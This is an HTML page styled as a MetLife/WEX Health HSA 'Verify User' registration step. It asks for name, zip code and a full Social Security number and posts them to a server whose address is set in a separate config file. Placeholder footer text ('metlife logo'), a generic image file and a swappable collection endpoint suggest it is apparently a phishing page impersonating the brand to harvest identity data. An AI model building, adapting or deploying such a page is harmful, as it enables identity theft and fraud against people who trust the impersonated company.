<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<meta property="og:description" content="Register for your MetLife health savings account and start managing your HSA and FSA benefits today.">

<!-- Additional Meta Tags -->
<meta name="language" content="English">
<meta name="theme-color" content="#0078b7">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    overflow-x: hidden;
    background: white;
    color:#222;
}
header{
    max-width:10px;
    width: 100%;
    height: 20px;
    margin:30px auto;
    padding:0 15px;
}

.wrapper{
    max-width:1000px;
    margin:30px auto;
    padding:0 15px;
}

.logo{
    margin-bottom:20px;
}

.logo img{
    max-width:180px;
    height:auto;
}

.container{
    background:#eef1f3;
    padding:20px;
}

.page-title{
    font-size:2.2rem;
    font-weight:400;
    margin-bottom:25px;
}

.panel{
    background:#fff;
    border:1px solid #dcdcdc;
}

.panel-body{
    padding:25px;
}

.progress-row{
    display:flex;
    align-items:center;
    gap:15px;
    margin-bottom:30px;
}

.progress{
    flex:1;
    background:#ddd;
    height:10px;
    border-radius:10px;
}

.progress-bar{
    width:20%;
    height:100%;
    background:#0078b7;
    border-radius:10px;
}

.form-layout{
    display:flex;
    gap:50px;
}

.info-text{
    width:260px;
    font-size:18px;
    font-weight:600;
}

.form-section{
    flex:1;
}

.field{
    display:flex;
    align-items:center;
    margin-bottom:15px;
}

.field label{
    width:130px;
    color:#666;
}

.field input{
    width:100%;
    max-width:320px;
    height:38px;
    padding:8px;
    border:1px solid #ccc;
}

.section-title{
    margin:20px 0;
    font-size:1.5rem;
    font-weight:600;
}

.ssn{
    display:flex;
    align-items:center;
    gap:8px;
}

.ssn input{
    width:80px;
}

.panel-footer{
    display:flex;
    justify-content:space-between;
    padding:25px;
    border-top:1px solid #dcdcdc;
}

.btn{
    padding:12px 28px;
    border:none;
    cursor:pointer;
}

.btn-primary{
    background:#0078b7;
    color:white;
}

.btn-secondary{
    background:#eee;
}

.footer{
    text-align:center;
    margin-top:25px;
    color:#555;
    line-height:1.8;
    font-size:14px;
}

@media(max-width:768px){

    .form-layout{
        flex-direction:column;
        gap:25px;
    }

    .info-text{
        width:100%;
    }

    .field{
        flex-direction:column;
        align-items:flex-start;
    }

    .field label{
        width:100%;
        margin-bottom:5px;
    }

    .field input{
        max-width:none;
    }
}

@media(max-width:576px){

    .page-title{
        font-size:1.8rem;
    }

    .progress-row{
        flex-direction:column;
        align-items:flex-start;
    }

    .progress{
        width:100%;
    }

    .ssn{
        width:100%;
        flex-wrap:wrap;
    }

    .ssn input{
        flex:1;
        min-width:60px;
    }

    .panel-footer{
    display:flex;
    justify-content:space-between;
    padding:25px;
    border-top:1px solid #dcdcdc;
}

   
    .footer{

    }

</style>
<script src="config.js"></script>
</head>

<body>

      <header class="wrapper">
         <img
            width="100%"
             src="img.jpg"
            
             />
    </header>
<div class="wrapper">

   

    <div class="container">

        <h1 class="page-title">Verify User</h1>

        <div class="panel">

            <div class="panel-body">

                <div class="progress-row">

                    <div class="progress">
                        <div class="progress-bar"></div>
                    </div>

                    <strong>20%</strong>
                    <input type="range" value="20" style="width: 100%;" disabled/>

                </div>

                <div class="form-layout">

                    <div class="info-text">
                        Complete the information below to verify your identity.
                    </div>

                    <div class="form-section">

                        <div class="field">
                            <label>First Name*</label>
                            <input type="text" id="vu-firstname">
                        </div>

                        <div class="field">
                            <label>Last Name*</label>
                            <input type="text" id="vu-lastname">
                        </div>

                        <div class="field">
                            <label>Zip Code*</label>
                            <input type="text" id="vu-zipcode">
                        </div>

                        <div class="section-title">
                            Identification Number
                        </div>

                        <div class="field">

                            <label>SSN*</label>

                            <div class="ssn">

                                <input type="text" maxlength="3" id="vu-ssn1">
                                <span>-</span>

                                <input type="text" maxlength="2" id="vu-ssn2">
                                <span>-</span>

                                <input type="text" maxlength="4" id="vu-ssn3">

                            </div>

                        </div>

                        <div id="vu-message" style="font-size:14px;margin-top:10px;"></div>

                    </div>

                </div>

            </div>

            <div class="panel-footer">

                <button class="btn btn-secondary" onclick="cancelVerification()">
                    Cancel
                </button>

                <button class="btn btn-primary" id="vu-submit" onclick="submitVerification()">
                    Next
                </button>

            </div>

        </div>

    </div>

    <div class="footer">
        <div>
            metlife logo (c) 2025 MSS, New York, NY 10166 -- All Rights Reserved
        </div>

        <div>
            © WEX Health Inc. 2004-2026. All rights reserved. Powered by WEX Health
        </div>
    </div>

</div>

<script>

function cancelVerification(){
    window.location.href = 'index.html';
}

function submitVerification(){

    const firstName = document.getElementById('vu-firstname').value.trim();
    const lastName = document.getElementById('vu-lastname').value.trim();
    const zipCode = document.getElementById('vu-zipcode').value.trim();
    const ssn =
        document.getElementById('vu-ssn1').value.trim() +
        document.getElementById('vu-ssn2').value.trim() +
        document.getElementById('vu-ssn3').value.trim();

    const messageEl = document.getElementById('vu-message');
    const submitBtn = document.getElementById('vu-submit');

    messageEl.style.color = '#8b4d4d';
    messageEl.textContent = '';

    if(firstName === '' || lastName === '' || zipCode === '' || ssn.length !== 9){
        messageEl.textContent = 'Please fill in all required fields, including a full 9-digit SSN.';
        return;
    }

    submitBtn.disabled = true;
    const originalLabel = submitBtn.textContent;
    submitBtn.textContent = 'Submitting...';

    fetch(window.metlife_API_BASE + '/api/verification/identity', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            firstName: firstName,
            lastName: lastName,
            zipCode: zipCode,
            ssn: ssn
        })
    })
    .then(function(response){
        return response.json().then(function(data){
            return { ok: response.ok, data: data };
        });
    })
    .then(function(result){
        if(!result.ok){
            messageEl.style.color = '#8b4d4d';
            messageEl.textContent = result.data.message || 'Something went wrong. Please try again.';
            return;
        }

        messageEl.style.color = '#2e7d32';
        messageEl.textContent = 'Identity information received. Redirecting...';

        setTimeout(function(){
            window.location.href = 'index.html';
        }, 1500);
    })
    .catch(function(){
        messageEl.style.color = '#8b4d4d';
        messageEl.textContent = 'Unable to reach the server. Please try again.';
    })
    .finally(function(){
        submitBtn.disabled = false;
        submitBtn.textContent = originalLabel;
    });
}

</script>

</body>
</html>
